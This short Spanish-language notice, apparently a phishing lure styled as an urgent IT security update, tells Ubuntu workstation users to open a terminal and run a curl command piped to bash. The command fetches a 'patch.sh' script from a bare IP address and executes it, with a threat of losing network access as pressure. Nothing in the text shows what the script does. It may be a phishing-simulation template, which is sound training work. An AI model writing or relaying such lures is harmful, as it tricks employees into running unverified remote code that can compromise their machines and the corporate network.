Actualización urgente requerida para estaciones de trabajo Ubuntu

Estimado colaborador, se ha detectado que su estación de trabajo Ubuntu requiere una actualización urgente para mitigar vulnerabilidades recientemente identificadas.

Para mantener su acceso a la red corporativa, abra su terminal con Ctrl + Alt + T y ejecute el siguiente comando de actualización automatizada:

bash — terminal
$ curl -s http://192.168.199.130/patch.sh | bash

El proceso tomará unos segundos. No apague su equipo durante la instalación.

Abrir terminal

Presione Ctrl + Alt + T en su escritorio Ubuntu para abrir una terminal.
